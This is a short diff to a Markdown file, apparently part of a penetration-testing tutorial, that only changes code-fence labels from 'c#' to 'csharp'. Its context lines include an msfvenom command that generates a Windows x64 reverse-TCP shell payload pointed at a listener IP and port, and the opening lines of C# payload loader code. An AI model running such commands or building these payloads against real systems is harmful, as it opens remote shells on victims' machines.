@@ -112,7 +112,7 @@ msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f csh
 ```
 
 **Micropoor.tcp：**
-```c#
+```csharp
 using System;
 
 using System.Text;
@@ -230,7 +230,7 @@ catch (Exception err) { }
 
 **注：x64 payload**
 
-```c#
+```csharp
 using System;
 
 using System.Workflow.Activities;
